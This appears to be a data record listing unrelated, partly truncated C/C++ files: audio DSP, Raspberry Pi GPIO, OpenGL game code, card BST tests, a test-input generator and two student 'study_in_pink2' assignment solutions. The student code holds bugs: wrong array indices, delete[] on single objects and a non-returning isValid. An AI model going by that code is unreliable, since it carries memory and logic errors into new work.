AudioHandle::InterleavingOutputBuffer out,\n                          size_t                                size)\n{\n\n    for(size_t i = 0; i < size; i += 2)\n    {\n\n        u = 0.5f * (in[LEFT] + in[RIGHT]); // mono input\n\n        // Process delay outs and output signal\n        sig_out_L = 0.0f;\n\t\tsig_out_R = 0.0f;\n        for(idx = 0; idx < DEL_NUM; idx++){\n\n\t\t\t// Read & output - LEFT\n            FDN",
    "#include \"study_in_pink2.h\"\n\n////////////////////////////////////////////////////////////////////////\n/// STUDENT'S ANSWER BEGINS HERE\n/// Complete the following functions\n/// DO NOT modify any parameters in the functions.\n////////////////////////////////////////////////////////////////////////\n\n//! 3.1 MAPS ELEMENTS \n\n// MapElement constructor implementation\nMapElement::MapElement(ElementType in_type) : type(in_type) {}\n\n// MapElement destructor implementation\nMapElement::~MapElement() {}\n\n// Implementation of getType method\nElementType MapElement::getType() const {\n    return type;\n}\n\n// Implementation of Path class (derived from MapElement)\nPath::Path() : MapElement(PATH) {}\n\n// Implementation of Wall class (derived from MapElement)\nWall::Wall() : MapElement(WALL) {}\n\n// Implementation of FakeWall class (derived from MapElement)\nFakeWall::FakeWall(int in_req_exp) : MapElement(FAKE_WALL) {\n    Position pos = getPosition();\n    int r = pos.getRow();\n    int c = pos.getCol();\n    in_req_exp = (r * 257 + c * 139 + 89) % 900 + 1;\n    req_exp = in_req_exp;\n}\n\n// Implementation of getPosition method\nPosition FakeWall::getPosition() const {\n    return position;\n}\n\n// Implementation of getReqExp() method\nint FakeWall::getReqExp() const {\n    return req_exp;\n}\n\n//! 3.2 Maps\n\n// Constructor implementation for Map class\nMap::Map(int num_rows, int num_cols, int num_walls, Position *array_walls, int num_fake_walls, Position *array_fake_walls) {\n    this->num_rows = num_rows;\n    this->num_cols = num_cols;\n\n    // Allocate memory for the map\n    map = new MapElement**[num_rows];\n    for (int i = 0; i < num_rows; ++i) {\n        map[i] = new MapElement*[num_cols];\n        for (int j = 0; j < num_cols; ++j) {\n            // Initialize each element as Path by default\n            map[i][j] = new Path();\n        }\n    }\n\n    // Place walls on the map\n    for (int i = 0; i < num_walls; ++i) {\n        int wall_row = array_walls[i].getRow();\n        int wall_col = array_walls[i].getCol();\n        delete map[wall_row][wall_col]; // Delete the existing Path object\n        map[wall_row][wall_col] = new Wall(); // Place a Wall object\n    }\n\n    // Place fake walls on the map\n    for (int i = 0; i < num_fake_walls; ++i) {\n        int fake_wall_row = array_fake_walls[i].getRow();\n        int fake_wall_col = array_fake_walls[i].getCol();\n        delete map[fake_wall_row][fake_wall_col]; // Delete the existing Path object\n        map[fake_wall_row][fake_wall_col] = new FakeWall(); // Place a FakeWall object\n    }\n}\n\n// Destructor implementation for Map class\nMap::~Map() {\n    // Deallocate memory for the map\n    for (int i = 0; i < num_rows; ++i) {\n        for (int j = 0; j < num_cols; ++j) {\n            delete map[i][j];\n        }\n        delete[] map[i];\n    }\n    delete[] map;\n}\n\n//! 3.3 Position\nPosition::Position(int r, int c) : r(r), c(c) {}\nint Position::getRow() const {\n    return r;\n}\nint Position::getCol() const {\n    return c;\n}\nvoid Position::setRow(int r) {\n    this->r = r;\n}\nvoid Position::setCol(int c) {\n    this->c = c;\n}\nstring Position::str() const {\n    return \"(\" + to_string(r) + \", \" + to_string(c) + \")\";\n}\nbool Position::isEqual(Position pos) const {\n    return r == pos.getRow() && c == pos.getCol();\n}\n\n//! 3.4 Moving objects\nconst Position Position::npos = Position(-1, -1);\nMovingObject::MovingObject(int index, const Position pos, Map *map, const string &name) \n: index(index), pos(pos), map(map), name(name){}\nPosition MovingObject::getCurrentPosition() const {\n    return pos;\n}\nbool Map::isValid(const Position &pos, MovingObject *mv_obj) const {\n    // Get the row and column indices of the position\n    int row = pos.getRow();\n    int col = pos.getCol();\n\n    // Check if the position is within the bounds of the map\n    if (row < 0 || row >= num_rows || col < 0 || col >= num_cols) {\n        return false;\n    }\n\n    // Get the type of the map element at the given position\n    ElementType element_type = map[row][col]->getType();\n\n    // Check if the moving object can move to the current position based on the map element type\n    switch (element_type) {\n        case PATH:\n            return true; // Objects can always move on a path\n        case WALL:\n            return false; // Objects cannot move through a wall\n        case FAKE_WALL:\n            // For Sherlock, FakeWall is always valid to move on\n            if (dynamic_cast<Sherlock *>(mv_obj)) {\n                return true;\n            }\n            // For Watson, FakeWall is valid if Watson's EXP meets the requirement\n            else if (dynamic_cast<Watson *>(mv_obj)) {\n                int required_exp = dynamic_cast<FakeWall *>(map[row][col])->getReqExp();\n                int watson_exp = dynamic_cast<Watson *>(mv_obj)->exp;\n                return watson_exp >= required_exp;\n            }\n            // For other moving objects, FakeWall is not valid\n            else {\n                return false;\n            }\n        default:\n            return false; //",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <string.h>\n#include <sys/utsname.h>\n\n\ntypedef struct _\u0441\u0438\u0441_\u0456\u043d\u0444 {\n    char *\u043d\u0430\u0437\u0432\u0430_\u0441\u0438\u0441\u0442\u0435\u043c\u0438;\n    char *\u043d\u0430\u0437\u0432\u0430_\u0432\u0443\u0437\u043b\u0430;\n    char *\u0437\u0431\u0456\u0440\u043a\u0430_\u044f\u0434\u0440\u0430;\n    char *\u0432\u0435\u0440\u0441\u0456\u044f;\n    char *\u0430\u0440\u0445\u0456\u0442\u0435\u043a\u0442\u0443\u0440\u0430;\n} \u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0430\u0406\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u044f;\n\n\nextern \"C\" int \u043e\u0442\u0440\u0438\u043c\u0430\u0442\u0438_\u0441\u0438\u0441\u0442\u0435\u043c\u043d\u0443_\u0456\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u044e(\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0430\u0406\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u044f *\u0441\u0438\u0441_\u0456\u043d\u0444, int \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443) {\n    struct utsname buffer;\n\n    errno = 0;\n    if (uname(&buffer) < 0) {\n        perror(\"uname\");\n        exit(EXIT_FAILURE);\n    }\n\n    if (\u0441\u0438\u0441_\u0456\u043d\u0444 == nullptr) {\n        perror(\"\u0441\u0438\u0441_\u0456\u043d\u0444\");\n        exit(EXIT_FAILURE);\n    }\n\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u043d\u0430\u0437\u0432\u0430_\u0441\u0438\u0441\u0442\u0435\u043c\u0438, buffer.sysname, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u043d\u0430\u0437\u0432\u0430_\u0432\u0443\u0437\u043b\u0430, buffer.nodename, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u0437\u0431\u0456\u0440\u043a\u0430_\u044f\u0434\u0440\u0430, buffer.release, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u0432\u0435\u0440\u0441\u0456\u044f, buffer.version, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n    strncpy(\u0441\u0438\u0441_\u0456\u043d\u0444->\u0430\u0440\u0445\u0456\u0442\u0435\u043a\u0442\u0443\u0440\u0430, buffer.machine, \u0440\u043e\u0437\u043c\u0456\u0440_\u0431\u0443\u0444\u0435\u0440\u0443);\n\n    // printf(\"system name = %s\\n\", buffer.sysname);\n    // printf(\"node name   = %s\\n\", buffer.nodename);\n    // printf(\"release     = %s\\n\", buffer.release);\n    // printf(\"version     = %s\\n\", buffer.version);\n    // printf(\"machine     = %s\\n\", buffer.machine);\n\n    return EXIT_SUCCESS;\n}\n\nextern \"C\" void \u0434\u0440\u0443\u043a_\u0441\u0456(const char* \u0444\u043e\u0440\u043c\u0430\u0442, char* \u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f = nullptr) {\n    printf(\u0444\u043e\u0440\u043c\u0430\u0442, \u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f);\n}",
    "//\n// Created by chiheb on 25/04/24.\n//\n#include <stdexcept>\n#include \"GPIOInput.hpp\"\n#include <pigpio.h>\nnamespace pitools {\n    namespace gpio {\n        GPIOInput::GPIOInput(const uint8_t &p) : GPIODevice(p) {\n            mode(GPIOMODE::INPUT);\n        }\n        std::shared_ptr<GPIOInput> GPIOInput::create(const uint8_t &p) {\n            return std::make_shared<GPIOInput>(p);\n        }\n\n        GPIOInput& GPIOInput::pullup() {\n            gpioSetPullUpDown(mPin,PI_PUD_UP);\n            return *this;\n        }\n\n        GPIOInput& GPIOInput::pulldown() {\n            gpioSetPullUpDown(mPin,PI_PUD_DOWN);\n            return *this;\n        }\n\n        GPIOInput& GPIOInput::pulloff() {\n            gpioSetPullUpDown(mPin,PI_PUD_OFF);\n            return *this;\n        }\n\n\n        GPIOInput& GPIOInput::waitUntil(const GPIOSTATE& state, uint32_t& duration,uint32_t timeout) {\n            auto start{gpioTick()};\n            if (timeout!=0) {\n                while (gpioRead(mPin)!=static_cast<int>(state)) {\n                    if (gpioTick()-start>=timeout) throw std::runtime_error(\"timeout\");;\n                    std::this_thread::yield();\n                }\n            }\n            else {\n                while (gpioRead(mPin)!=static_cast<int>(state)) {\n                    std::this_thread::yield();\n                }\n            }\n            duration=gpioTick()-start;\n            return *this;\n        }\n    }\n}",
    "//C++ Standard Template\r\n#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <fstream>\r\n#include <cmath>\r\n\r\n//Third Party\r\n#include <glad/glad.h>\r\n#include <GLFW/glfw3.h>\r\n#include <SDL/SDL.h>\r\n#include <glm/vec3.hpp> // glm::vec3\r\n#include <glm/vec4.hpp> // glm::vec4\r\n#include <glm/mat4x4.hpp> // glm::mat4\r\n//#include <glm/ext/matrix_transform.hpp> // glm::translate, glm::rotate, glm::scale\r\n#include <glm/ext/matrix_clip_space.hpp> // glm::perspective\r\n#include <glm/ext/scalar_constants.hpp> // glm::pi\r\n#include <glm/gtc/matrix_transform.hpp>\r\n#define GLM_ENABLE_EXPERIMENTAL\r\n#include <glm/gtx/string_cast.hpp>\r\n\r\n//GLOBAL VARIABLES\r\nint gScreenWidth = 1000;\r\nint gScreenHeight = 1000;\r\nSDL_Window*\t\tgGraphicsApplicationWindow = nullptr;\r\nSDL_GLContext\tgOpenGLContext = nullptr;\r\n\r\nbool gQuit = false; //If true, quit\r\n\r\n\r\n//VAO (stores attributes)\r\nGLuint gVertexArrayObject = 0;\r\n\r\n//VBO (stores data) - accessed by VAO\r\nGLuint gVertexBufferObject = 0;\r\n\r\n//Index Buffer Object (IBO)\r\nGLuint gIndexBufferObject = 0;\r\n\r\n//Program object for shaders\r\nGLuint gGraphicsPipelineShaderProgram = 0;\r\n\r\n//Movement variables for Quads\r\nfloat g_uOffset = 0.0f;\r\nfloat g_uOffsetQuad1 = -0.7f;\r\nfloat g_uOffsetQuad5 = 0.0f;\r\nfloat g_uOffsetQuad6 = 0.0f;\r\nfloat g_uOffsetQuad7 = 0.0f;\r\n\r\n//Gravity Variables\r\nfloat g_vOffsetQuad1 = -0.75f;\r\nfloat g_vOffsetQuad5 = 0.0f;\r\nfloat g_vOffsetQuad6 = 0.0f;\r\nfloat g_vOffsetQuad7 = 0.0f;\r\nfloat gGravity = -0.00009999f;\r\nbool isCollide = false;\r\nbool isDivide = false;\r\nbool canJump = false;\r\n\r\n//Collision Struct\r\nstruct Collider {\r\n\tglm::vec2 position;\r\n\tglm::vec2 size;\r\n};\r\n\r\n//Vector to store Colliders\r\nstd::vector<Collider> colliders;\r\n\r\n\r\n//Defining Colliders\r\nCollider quad1Collider = { glm::vec2(0.09f, -0.09f), glm::vec2(0.09f, -0.11f) }; //Character\r\nCollider quad2Collider = { glm::vec2(-0.9f, -0.9f), glm::vec2(1.8f, 0.19f) }; // Floor\r\nCollider quad3Collider = { glm::vec2(-0.9f, -0.8f), glm::vec2(0.19f, 1.8f) }; // Left Wall\r\nCollider quad4Collider = { glm::vec2(0.8f, -0.8f), glm::vec2(0.09f, 1.8f) };  // Right Wall\r\nCollider quad5Collider = { glm::vec2(-0.02f, 0.2f), glm::vec2(0.02f, 1.5f) };  // Middle Divider\r\nCollider quad6Collider;\r\nCollider quad7Collider;\r\n\r\n\r\n\r\n\r\nstd::string LoadShaderAsString(const std::string& filename) {\r\n\r\n\t//shader program loaded as single string. Dont want to compile everytime\r\n\tstd::string result = \"\"; \r\n\r\n\tstd::string line = \"\";\r\n\tstd::ifstream myFile(filename.c_str());\r\n\r\n\tif (myFile.is_open()) {\r\n\t\twhile (std::getline(myFile, line)) {\r\n\t\t\tresult += line + '\\n';\r\n\t\t}\r\n\t\tmyFile.close();\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\nGLuint CompileShader(GLuint type, const std::string& source) {\r\n\tGLuint shaderObject{};\r\n\r\n\t//for error checking\r\n\tif (type == GL_VERTEX_SHADER) {\r\n\t\tshaderObject = glCreateShader(GL_VERTEX_SHADER);\r\n\t}\r\n\telse if (type == GL_FRAGMENT_SHADER) {\r\n\t\tshaderObject = glCreateShader(GL_FRAGMENT_SHADER);\r\n\t}\r\n\r\n\tconst char* src = source.c_str();\r\n\tglShaderSource(shaderObject, 1, &src, nullptr);\r\n\tglCompileShader(shaderObject);\r\n\r\n\treturn shaderObject;\r\n}\r\n\r\nGLuint CreateShaderProgram(const std::string& vertexshadersource, const std::string& fragmentshadersource) {\r\n\tGLuint programObject = glCreateProgram();\r\n\r\n\tGLuint myVertexShader = CompileShader(GL_VERTEX_SHADER, vertexshadersource);\r\n\tGLuint myFragmentShader = CompileShader(GL_FRAGMENT_SHADER, fragmentshadersource);\r\n\r\n\tglAttachShader(programObject, myVertexShader);\r\n\tglAttachShader(programObject, myFragmentShader);\r\n\tglLinkProgram(programObject);\r\n\r\n\t//validate program\r\n\tglValidateProgram(programObject);\r\n\r\n\treturn programObject;\r\n}\r\n\r\nvoid CreateGraphicsPipeline() {\r\n\r\n\tstd::string vertexShaderSource = LoadShaderAsString(\"./vert.glsl\");\r\n\tstd::string fragmentShaderSource = LoadShaderAsString(\"./frag.glsl\");\r\n\r\n\tgGraphicsPipelineShaderProgram = CreateShaderProgram(vertexShaderSource, fragmentShaderSource);\r\n\r\n}\r\n\r\nvoid GetOpenGLVersionInfo() {\r\n\tstd::cout << \"Vendor: \" << glGetString(GL_VENDOR) << std::endl;\r\n\tstd::cout << \"Renderer \" << glGetString(GL_RENDERER) << std::endl;\r\n\tstd::cout << \"Version: \" << glGetString(GL_VERSION) << std::endl;\r\n\tstd::cout << \"Shading Language: \" << glGetString(GL_SHADING_LANGUAGE_VERSION) << std::endl;\r\n}\r\n\r\nvoid VertexSpecification(std::vector<GLfloat> &vertexData) {\r\n\r\n\t//Lives on the CPU\r\n\tvertexData = \r\n\t{\r\n\t\t //x      y      z\r\n\t\t // Quad 1 (Character)\r\n\t\t //0 - Vertex\r\n\t\t-0.09f,-0.09f, 0.0f,    //Left vertex\r\n\t\t 1.0f, 0.0f, 0.0f,     //Color\r\n\t\t //1 - Vertex\r\n\t\t 0.09f, -0.09f, 0.0f,    //Right vertex \r\n\t\t 0.0f, 1.0f, 0.0f,     //Color\r\n\t\t //2 - Vertex\r\n\t\t-0.09f, 0.09f, 0.0f,     //Top left vertex \r\n\t\t 0.0f, 0.0f, 1.0f,     //Color\r\n\t\t //3 - Vertex\r\n\t\t 0.09f, 0.09f, 0.0f,\t//Top right vertex\r\n\t\t 0.0f, 0.0f, 1.0f,     //Color\r\n\r\n\t\t //Quad 2 (Floor)\r\n\t\t//0 - Vertex\r\n\t\t-0.9f, -0.9f, 0.0f,    // Left vertex\r\n\t\t 0.0f, 0.0f, 0.0f,     // Color\r\n\t\t //1 - Vertex\r\n\t\t 0.9f, -0.9f, 0.0f,    // Right vertex \r\n\t\t 0.0f, 0.0f, 0.0f,     // Color\r\n\t\t //2 - Ver",
    "#include \"study_in_pink2.h\"\n\n////////////////////////////////////////////////////////////////////////\n/// STUDENT'S ANSWER BEGINS HERE\n/// Complete the following functions\n/// DO NOT modify any parameters in the functions.\n////////////////////////////////////////////////////////////////////////\nclass TestStudyInPink;\n//3.1\n/*MapElement::MapElement(ElementType in_type){\n        type=in_type;\n    }\n    \nElementType MapElement::getType() const{\n    return this->type;\n}\n\nFakeWall::FakeWall(int in_req_exp) : MapElement(FAKE_WALL){\n        req_exp=in_req_exp;\n    }\n\nint FakeWall::getReqExp() const{\n    return this->req_exp;\n}*/\n//3.2\nMap::Map(int num_rows, int num_cols, int num_walls, Position * array_walls, int num_fake_walls, Position * array_fake_walls) : num_rows(num_rows), num_cols(num_cols){\n    map = new MapElement ** [num_rows];\n    for(int i=0; i<num_rows; i++){\n        map[i] = new MapElement * [num_cols];\n        for(int j=0; j<num_cols; j++){\n            map[i][j]=new Path();\n        }\n    }\n    for(int i=0; i<num_walls; i++){\n        delete map[array_walls[i].getRow()][array_walls[i].getCol()];\n        map[array_walls[i].getRow()][array_walls[i].getCol()]= new Wall();\n    }\n    for(int i=0; i<num_fake_walls; i++){\n        int in_req_exp = (array_fake_walls[i].getRow() * 257 + array_fake_walls[i].getCol() * 139 + 89) % 900 + 1;\n        delete map[array_fake_walls[i].getRow()][array_fake_walls[i].getCol()];\n        map[array_walls[i].getRow()][array_walls[i].getCol()]= new FakeWall(in_req_exp);\n    }\n}\n\nMap::~Map(){\n    for(int i=0; i<num_rows; i++){\n        for (int j=0; j<num_cols; j++){\n            delete [] map[i][j];\n        }\n        delete [] map[i];\n    }\n    delete [] map;\n}\n\nbool Map::isValid ( const Position & pos , MovingObject * mv_obj ) const{}\n\n\n//3.3\nPosition::Position(const string & str_pos){\n        string a=str_pos.substr(1, str_pos.find(\",\") - 1);\n        string b=str_pos.substr(str_pos.find(\",\") + 1, str_pos.find(\")\") - 1);\n        this->r=stoi(a);\n        this->c=stoi(b);\n        /*stringstream str2num1(a);\n        int x=0;\n        str2num1 >> x;\n        stringstream str2num2(b);\n        int y=0;\n        str2num2 >> y;\n        this->r=x;\n        this->c=y;*/\n    }\n\n/*int Position::getRow() const{\n        return this->r;\n    }\nint Position::getCol() const{\n        return this->c;\n    }\nvoid Position::setRow(int r){\n        this->r=r;\n    }\nvoid Position::setCol(int c){\n        this->c=c;\n    }*/\n\nstring Position::str() const{\n        string thongtin=\"(\" + to_string(r) + \",\" + to_string(c) + \")\";\n        return thongtin;\n    }\n\nbool Position::isEqual(int in_r, int in_c) const{\n    return r==in_r && c==in_c;\n}\n\nconst Position Position::npos=Position(-1,-1);\n//3.4\n/*MovingObject::MovingObject(int index, const Position pos, Map * map, const string & name=\"\"){\n        this->index=index;\n        this->pos=pos;\n        this->map=map;\n        this->name=name;\n    }*/\n//3.5\nPosition Sherlock::getNextPosition(){\n    char move=moving_rule[move_index];\n    move_index=(move_index + 1)%moving_rule.size();\n    Position next_pos=pos;\n    switch(move){\n        case 'L':\n        next_pos.setCol(pos.getCol()-1);\n        break;\n        case 'R':\n        next_pos.setCol(pos.getCol()+1);\n        break;\n        case 'U':\n        next_pos.setRow(pos.getRow()+1);\n        break;\n        case 'D':\n        next_pos.setRow(pos.getRow()-1);\n        break;\n    }\n    return map->isValid(next_pos, this) ? next_pos : Position::npos;\n}\n\nvoid Sherlock::move(){\n    Position next_pos = getNextPosition();\n    if(!(next_pos == Position::npos)){\n        pos=next_pos;\n    }\n}\n\nstring Sherlock::str() const{\n    return \"Sherlock[index=\" + to_string(index) + \";pos=\" + pos.str() + \";moving_rule=\" + moving_rule + \"]\";\n}\n//3.6\nPosition Watson::getNextPosition(){\n    char move=moving_rule[move_index];\n    move_index=(move_index + 1)%moving_rule.size();\n    Position next_pos=pos;\n    switch(move){\n        case 'L':\n        next_pos.setCol(pos.getCol()-1);\n        break;\n        case 'R':\n        next_pos.setCol(pos.getCol()+1);\n        break;\n        case 'U':\n        next_pos.setRow(pos.getRow()+1);\n        break;\n        case 'D':\n        next_pos.setRow(pos.getRow()-1);\n        break;\n    }\n    return map->isValid(next_pos, this) ? next_pos : Position::npos;\n}\n\nvoid Watson::move(){\n    Position next_pos = getNextPosition();\n    if(!(next_pos == Position::npos)){\n        pos=next_pos;\n    }\n}\n\nstring Watson::str() const{\n    return \"Watson[index=\" + to_string(index) + \";pos=\" + pos.str() + \";moving_rule=\" + moving_rule + \"]\";\n}\n//3.7\nPosition Criminal::getNextPosition(){\n    int move_Up = abs(pos.getRow() + 1 - sherlock->getpos().getRow()) + abs(pos.getCol() - sherlock->getpos().getCol()) + abs(pos.getRow() + 1 - watson->getpos().getRow()) +abs(pos.getCol() - watson->getpos().getCol());\n    int move_Left = abs(pos.getRow() - sherlock->getpos().getRow()) + abs(pos.getCol() - 1 - sherlock->getpos().getCol()) + abs(pos.getRow() - w",
    "// tests.cpp\r\n// Author: Margaux Blondel\r\n// These files should contain test code for all the classes and methods you used in your game. We recommend at least 5 test cases for each public member function.\r\n\r\n#include <iostream>\r\n#include <fstream>\r\n#include <cstring>\r\n#include \"cards.h\"\r\n#include \"utility.h\"\r\n\r\nusing namespace std;\r\n\r\n/*\r\nc, d, s, h\r\na, 2,3, 4, 5, 6, 7, 8, 9, 10, j, q, k\r\n*/\r\n\r\nint main(int argv, char** argc){\r\n    \r\n    cout << endl << \"---------------TESTS----------------\" << endl;\r\n\r\n    // cards tests\r\n    cout << endl << \"---------------CARDS----------------\";\r\n    \r\n    // create cards\r\n    cout << endl << \"Create card : c a\";\r\n    Card a('c',\"a\");\r\n    a.printControl();\r\n\r\n    cout << endl << \"Create card : h 10\";\r\n    Card b('h',\"10\");\r\n    b.printControl();\r\n\r\n    cout << endl << \"Create card : c 10\";\r\n    Card c('c',\"10\");\r\n    c.printControl();\r\n\r\n    cout << endl << \"Create card : d q\";\r\n    Card d('d',\"q\");\r\n    d.printControl();\r\n\r\n    //Copy constructor\r\n    cout << endl << \"Create card : h q\";\r\n    Card e('h',\"q\");\r\n    e.printControl();\r\n    cout << endl << \"Create a copie : \";\r\n    Card f(e);\r\n    f.printControl();\r\n    cout << endl << \"Create a copie : \";\r\n    Card g=f;\r\n    g.printControl();\r\n    g=e;\r\n    g.printControl();\r\n    \r\n    // operators cards\r\n    \r\n    // <\r\n    cout << endl << \"c 10 < c a ?   : \" ;\r\n    cout << (c < a) << \" (except false)\";\r\n\r\n    cout << endl << \"c 10 < h 10 ?  : \" ;\r\n    cout << (c < b) << \" (except true)\";\r\n    \r\n    cout << endl << \"c a < c a ?    : \" ;\r\n    cout << (a < a) << \" (except false)\";\r\n    \r\n    // >\r\n    cout << endl << \"c 10 > c a ?   : \" ;\r\n    cout << (c > a) << \" (except true)\";\r\n\r\n    cout << endl << \"c 10 > h 10 ?  : \" ;\r\n    cout << (c > b) << \" (except false)\";\r\n    \r\n    cout << endl << \"c a > c a ?    : \" ;\r\n    cout << (a > a) << \" (except false)\";\r\n    \r\n    // ==\r\n    cout << endl << \"c 10 == c a ?  : \" ;\r\n    cout << (c == a) << \" (except false)\";\r\n\r\n    cout << endl << \"c 10 == h 10 ? : \" ;\r\n    cout << (c == b) << \" (except false)\";\r\n\r\n    cout << endl << \"c a == c a ?   : \" ;\r\n    cout << (a == a) << \" (except true)\";\r\n\r\n    cout << endl << \"-------------END-CARDS--------------\" << endl;\r\n\r\n    // BST tests\r\n    cout << endl << \"---------------CARDBST--------------\";\r\n\r\n    cout << endl << \"Create BST : c a , h 10, c 10\" ;\r\n    \r\n    // create a tree\r\n    CardsBST tree;\r\n    tree.insert(a);\r\n    tree.insert(b);\r\n    tree.insert(c);\r\n    cout << endl << \"PreOrder   : \";\r\n    tree.printPreOrder();\r\n    cout << endl << \"InOrder    : \";\r\n    tree.printInOrder();\r\n\r\n    // number of Node in the tree\r\n    cout << endl << \"Number of Node : \" << tree.count();\r\n\r\n    //Predecessor and sucessor\r\n    cout << endl << \"Values      : \" ;\r\n    Card listCards[3]={a, b, c};\r\n    for (Card ca : listCards){\r\n        ca.print();\r\n        cout << \" | \";\r\n    }\r\n\r\n    cout << endl << \"Predecessor : \";\r\n    for (Card ca : listCards){\r\n        tree.getPredecessor(ca).print();\r\n        cout << \" | \";\r\n    }\r\n\r\n    cout << endl << \"Successor   : \";\r\n    for (Card ca : listCards){\r\n        tree.getSuccessor(ca).print();\r\n        cout << \" | \";\r\n    }\r\n\r\n    cout << endl << \"Values order : \" ;\r\n    for (int i=1; i<5; i++){\r\n        tree.cardInPosition(i).print();\r\n        cout << \" | \";\r\n    }\r\n\r\n    cout << endl << \"Values rever : \" ;\r\n    for (int i=1; i<5; i++){\r\n        tree.cardInPositionReverse(i).print();\r\n        cout << \" | \";\r\n    }\r\n\r\n    // contain\r\n    cout << endl << \"contain h 10 ? : \" << tree.contains(Card('h',\"10\"));\r\n    cout << endl << \"contain h k ?  : \" << tree.contains(Card('h',\"k\"));\r\n    cout << endl << \"remove c a, Inorder  : \";\r\n    tree.remove(a);\r\n    tree.printInOrder();\r\n    cout << endl << \"remove c 10, Inorder : \";\r\n    tree.remove(b);\r\n    tree.printInOrder();\r\n    cout << endl << \"remove h 10, Inorder : \";\r\n    tree.remove(c);\r\n    tree.printInOrder();\r\n    cout << endl << \"contain h 10 ? : \" << tree.contains(Card('h',\"10\"));\r\n\r\n    cout << endl << \"-------------END-CARDBST------------\" << endl;\r\n\r\n    cout << endl << \"---------------UTILITY--------------\";\r\n    \r\n    // test getCard\r\n    string astr = \"h 10\";\r\n    cout << endl << \"Read string : h 10\";\r\n    cout << endl << \"Create card : \";\r\n    getCard(astr).print();\r\n    string bstr = \"s q\";\r\n    cout << endl << \"Read string : s q\";\r\n    cout << endl << \"Create card : \";\r\n    getCard(bstr).print();\r\n    cout << endl << \"-------------END-UTILITY------------\" << endl;\r\n\r\n    cout << endl << \"-------------END-TESTS--------------\" << endl;\r\n\r\n    return 0;\r\n}",
    "/**\n * THIS CODE WAS TAKEN FROM https://piazza.com/class/lrkxtzhdnc831h/post/80. \n * THIS IS CODE PROVIDED BY THE PROFESSOR, KENNETH CHIU, TO ASSIST WITH\n * GENERATING TEST RESULTS FOR ASSIGNMENT 2. \n*/\n\n#include <iostream>\n#include <vector>\n#include <string>\n#include <random>\n#include <iomanip> // Required for std::setw and std::setfill\n\nusing namespace std;\n\nclass RandomGenerator {\npublic:\n    default_random_engine eng{random_device{}()};\n    uniform_int_distribution<int> str_len{10, 20};\n    uniform_int_distribution<int> char_dist{32, 126};\n    uniform_int_distribution<int> spaceDist{0, 10};\n\n\n    char getRandomChar() {\n        char randomChar;\n        do {\n            randomChar = static_cast<char>(char_dist(eng));\n\n        } while (randomChar == '\\\"' || randomChar == '.');\n        return randomChar;\n    }\n\n    string generateRandomString() {\n        int length = str_len(eng);\n        string str;\n        str.reserve(length);\n        for (int i = 0; i < length; ++i) {\n\n            char randomChar = getRandomChar();\n\n            if (randomChar == '\\\\') { // Ensure there's space for 2 characters\n                if (i >= length - 1) {\n                    continue;\n                }\n                str += randomChar; // Add the first '\\'\n                str += getRandomSpecialChar(); // Add the second character, which is either '\\', '.', or '\"'\n                i++; // Increment i since we've added two characters\n            } else {\n                str += randomChar;\n            }\n        }\n        return str;\n    }\n\n\n    const string &generateRandomSpace() {\n        static vector<string> vs {\n            \"\",\n            \" \", \n            \"  \", \n            \"   \", \n            \"    \",\n            \"     \"\n        };\n        int r = spaceDist(eng);\n        if (r >= vs.size()) {\n            return vs[0];\n        }\n        return vs[r];\n    }\n\nprivate:\n    const string allowedChars = \"\\\\\\\"\";\n    uniform_int_distribution<int> specialCharDist{0, 1};\n\n    char getRandomSpecialChar() {\n        return allowedChars[specialCharDist(eng)];\n    }\n};\n\nint main(int argc, char const *argv[]) {\n    size_t n_line = 10;\n    if (argc >= 2) {\n        n_line = stoul(argv[1]);\n    }\n    const int numStrings = std::min<int>(n_line, 10000); // Use n_line instead of a fixed number\n    vector<string> randomStrings;\n    RandomGenerator randGen;\n\n    // Generate n_line random strings\n    for (int i = 0; i < numStrings; ++i) {\n        randomStrings.push_back(randGen.generateRandomString());\n    }\n    uniform_int_distribution<> intDist(0, 1000000000);\n    uniform_int_distribution<> strDist(0, numStrings - 1);\n    uniform_int_distribution<> zeroDist(1, 3);\n\n\n    for (size_t i = 0; i < n_line; ++i) {\n        int randomInt = intDist(randGen.eng);\n        int str_id =  strDist(randGen.eng);\n        int r = zeroDist(randGen.eng);\n        if ( r == 1) {\n            cout << \"\\\"\" << randomStrings[str_id] << \"\\\"\" << randGen.generateRandomSpace() << std::setfill('0') << std::setw(11) << randomInt << endl;\n        } else {\n            cout << \"\\\"\" << randomStrings[str_id] << \"\\\"\" << randGen.generateRandomSpace() << randomInt << endl;\n        }\n    }\n\n    return 0;\n}",
